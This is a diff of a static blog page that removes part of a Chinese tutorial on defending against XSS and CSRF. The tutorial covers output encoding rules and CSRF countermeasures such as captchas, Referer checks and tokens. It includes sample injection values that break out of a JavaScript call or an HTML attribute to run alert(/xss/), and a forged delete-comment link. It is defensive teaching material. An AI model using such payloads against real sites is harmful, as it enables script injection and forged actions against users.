-<p>如：<span onclick="fun({$var})">hello!click me!</span></p>
-<p>风险：{$var} 为 ); alert(/xss/); //</p>
-<p>防御手段：确保输出变量在引号里面，再让变量JavaScriptEncode后输出。</p>
-<p><strong>在CSS中输出</strong></p>
-<p>一般来说，尽量禁止用户可控制的变量在<style>标签和style属性中输出。</p>
-<p><strong>在地址中输出</strong></p>
-<p>如：<a href="http://3g.cn/?test={$var}" target="_blank" rel="noopener"></p>
-<p>风险：{$var} 为 “ onclick=”alert(/xss/)</p>
-<p>防御手段：对URL中除 协议(Protocal) 和 主机(Host) 外进行URLEncode。如果整个链接都由变量输出，则需要判断是不是http开头。</p>
-<h3 id="HtmlEncode"><a href="#HtmlEncode" class="headerlink" title="HtmlEncode"></a>HtmlEncode</h3><p>对下列字符实现编码</p>
-<p>&amp;     ——》    &amp;</p>
-<p>&lt;     ——》    &lt;</p>
-<blockquote>
-<pre><code>——》    &amp;gt;</code></pre></blockquote>
-<p>“    ——》    &quot;</p>
-<p>‘    ——》    &#39; （IE不支持&apos;）</p>
-<p>/      ——》    &#x2F;</p>
-<h3 id="JavaScriptEncode"><a href="#JavaScriptEncode" class="headerlink" title="JavaScriptEncode"></a>JavaScriptEncode</h3><p>对下列字符加上反斜杠</p>
-<p>“    ——》    \“</p>
-<p>‘    ——》    \‘</p>
-<p>\      ——》    \\</p>
-<p>\n    ——》    \\n</p>
-<p>\r     ——》    \\r      (Windows下的换行符)</p>
-<p>例子： “\&quot;.replace(/\/g, “\\\“);  //return \\</p>
-<p>推荐一个JavaScript的模板引擎：<a href="http://aui.github.com/artTemplate/%20" target="_blank" rel="noopener"><strong>artTemplate</strong></a></p>
-<h3 id="URLEncode"><a href="#URLEncode" class="headerlink" title="URLEncode"></a>URLEncode</h3><p>使用以下JS原生方法进行URI编码和解码：</p>
-<ul>
-<li>encodeURI</li>
-<li>decodeURI</li>
-<li>decodeURIComponent</li>
-<li>encodeURIComponent</li>
-</ul>
-<hr>
-<h2 id="CSRF（Cross-site-request-forgery）"><a href="#CSRF（Cross-site-request-forgery）" class="headerlink" title="CSRF（Cross-site request forgery）"></a>CSRF（Cross-site request forgery）</h2><p><a href="http://storage.veitor.net/uploads/2014/08/28232804-51bdd6fb20674c99a3af90124348859c.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28232804-51bdd6fb20674c99a3af90124348859c.png" alt="28232804-51bdd6fb20674c99a3af90124348859c"></a></p>
-<p>CSRF 即：<strong>跨站点请求伪造</strong></p>
-<p>网站A ：为恶意网站。</p>
-<p>网站B ：用户已登录的网站。</p>
-<p>当用户访问 A站 时，A站 私自访问 B站 的操作链接，模拟用户操作。</p>
-<p>假设B站有一个删除评论的链接：<a href="http://b.com/comment/?type=delete&amp;id=81723" target="_blank" rel="noopener">http://b.com/comment/?type=delete&amp;id=81723</a></p>
-<p>A站 直接访问该链接，就能删除用户在 B站 的评论。</p>
-<h3 id="CSRF-的攻击策略"><a href="#CSRF-的攻击策略" class="headerlink" title="CSRF 的攻击策略"></a>CSRF 的攻击策略</h3><p>因为浏览器访问 B站 相关链接时，会向其服务器发送 B站 保存在本地的Cookie，以判断用户是否登陆。所以通过 A站 访问的链接，也能顺利执行。</p>
-<hr>
-<h2 id="CSRF-防御技巧"><a href="#CSRF-防御技巧" class="headerlink" title="CSRF 防御技巧"></a>CSRF 防御技巧</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>几乎所有人都知道验证码，但验证码不单单用来防止注册机的暴力破解，还可以有效防止CSRF的攻击。</p>
-<p>验证码算是对抗CSRF攻击最简洁有效的方法。</p>
-<p>但使用验证码的问题在于，不可能在用户的所有操作上都需要输入验证码。</p>
-<p>只有一些关键的操作，才能要求输入验证码。</p>
-<p>不过随着HTML5的发展。</p>
-<p>利用canvas标签，前端也能识别验证码的字符，让CSRF生效。</p>
-<h3 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h3><p>Referer Check即来源检测。</p>
-<p>HTTP Referer 是 Request Headers 的一部分，当浏览器向web服务器发出请求的时候，一般会带上Referer，告诉服务器用户从哪个站点链接过来的。</p>
-<p>服务器通过判断请求头中的referer，也能避免CSRF的攻击。</p>
-<h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><p>CSRF能攻击成功，根本原因是：操作所带的参数均被攻击者猜测到。</p>
-<p>既然知道根本原因，我们就对症下药，利用Token。</p>
-<p>当向服务器传参数时，带上Token。这个Token是一个随机值，并且由服务器和用户同时持有。</p>
-<p>Token可以存放在用户浏览器的Cookie中，</p>
-<p>当用户提交表单时带上Token值，服务器就能验证表单和Cookie中的Token是否一致。</p>
-<p>（前提，网站没有XSS漏洞，攻击者不能通过脚本获取用户的Cookie）</p>
-<p>原文地址：<a href="http://www.cnblogs.com/alilang/archive/2013/01/29/2880843.html" target="_blank" rel="noopener">http://www.cnblogs.com/alilang/archive/2013/01/29/2880843.html</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1420,7 +1267,7 @@ background-size: 100px auto;
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">91</span>
+          <span class="site-state-item-count">92</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
